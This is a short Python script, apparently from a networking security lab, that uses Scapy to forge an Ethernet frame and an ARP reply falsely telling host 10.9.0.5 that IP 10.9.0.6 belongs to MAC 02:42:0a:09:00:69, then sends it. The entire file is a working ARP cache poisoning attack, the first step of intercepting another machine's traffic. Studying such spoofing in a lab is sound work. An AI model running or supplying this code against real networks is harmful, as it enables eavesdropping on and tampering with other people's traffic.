#!/usr/bin/python3
from scapy.all import *

E = Ether(src="02:42:0a:09:00:69", dst="02:42:0a:09:00:05")

A = ARP(hwsrc='02:42:0a:09:00:69',psrc='10.9.0.6', 
	hwdst='02:42:0a:09:00:05', pdst='10.9.0.5')

A.op = 2 # 1 for ARP request; 2 for ARP reply

pkt = E/A
pkt.show()
sendp(pkt)

